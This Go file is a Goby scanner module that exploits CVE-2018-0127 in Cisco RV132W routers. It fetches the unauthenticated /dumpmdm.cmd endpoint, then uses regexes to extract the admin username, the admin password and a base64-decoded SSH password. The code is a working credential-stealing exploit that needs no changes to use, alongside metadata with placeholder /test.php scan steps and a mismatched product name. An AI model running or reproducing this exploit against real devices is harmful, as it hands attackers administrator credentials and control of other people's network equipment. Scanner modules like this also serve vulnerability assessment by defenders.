package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cisco RV132W dumpmdm.cmd Information Disclosure Vulnerability (CVE-2018-0127)",
    "Description": "<p>Cisco RV132W ADSL2+ Wireless-N VPN is a router of Cisco (Cisco). Web interface is one of the web interfaces.</p><p>The attacker reads sensitive system information by constructing a special URL address.</p>",
    "Product": "CISCO-RV130W",
    "Homepage": "https://www.cisco.com/",
    "DisclosureDate": "2021-05-26",
    "PostTime": "2023-07-31",
    "Author": "732903873@qq.com",
    "FofaQuery": "body=\"RV132W\"",
    "GobyQuery": "body=\"RV132W\"",
    "Level": "3",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.example.com\">https://www.cisco.com/</a></p>",
    "References": [
        "https://ssd-disclosure.com/ssd-advisory-hack2win-cisco-rv132w-multiple-vulnerabilities/",
        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180207-rv13x"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2018-0127"
    ],
    "CNNVD": [
        "CNNVD-201802-272"
    ],
    "CNVD": [
        "CNVD-2018-05553"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Cisco RV132W dumpmdm.cmd 信息泄露漏洞（CVE-2018-0127）",
            "Product": "CISCO-RV132W",
            "Description": "<p>Cisco RV132W ADSL2+ Wireless-N VPN是美国思科（Cisco）公司的路由器。Web interface是其中的一个Web界面。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.example.com\" target=\"_blank\">https://www.cisco.com/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Cisco RV132W dumpmdm.cmd Information Disclosure Vulnerability (CVE-2018-0127)",
            "Product": "CISCO-RV130W",
            "Description": "<p>Cisco RV132W ADSL2+ Wireless-N VPN is a router of Cisco (Cisco). Web interface is one of the web interfaces.</p><p>The attacker reads sensitive system information by constructing a special URL address.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.example.com\" target=\"_blank\">https://www.cisco.com/</a><br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9687"
}`

	strContainList := func(rawStr string, checkStrList []string) bool {
		for _, checkStr := range checkStrList {
			if !strings.Contains(rawStr, checkStr) {
				return false
			}
		}
		return true
	}
	getRegStr := func(reg, RawStr string) string {
		result := regexp.MustCompile(reg).FindStringSubmatch(RawStr)
		if len(result) > 1 {
			return result[1]
		}
		return ""
	}
	b64Decode := func(b64 string) string {
		decoded, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			return b64
		}
		return string(decoded)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStrList := []string{
				"AdminPassword", "sshpass",
				"AdminUserName", "logintimeout",
			}
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/dumpmdm.cmd"); err == nil {
				return resp.StatusCode == 200 && strContainList(resp.Utf8Html, checkStrList)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/dumpmdm.cmd"); err == nil {
				sshpass := getRegStr("&lt;sshpass&gt;(.*?)&lt;/sshpass&gt", resp.Utf8Html)
				adminUser := getRegStr("&lt;AdminUserName&gt;(.*?)&lt;/AdminUserName&gt", resp.Utf8Html)
				adminPasswd := getRegStr("&lt;AdminPassword&gt;(.*?)&lt;/AdminPassword&gt", resp.Utf8Html)
				expResult.Success = true
				expResult.Output = fmt.Sprintf("sshpass:%s\nadminUser:%s\nadminPasswd:%s", b64Decode(sshpass), adminUser, adminPasswd)
			}
			return expResult
		},
	))
}
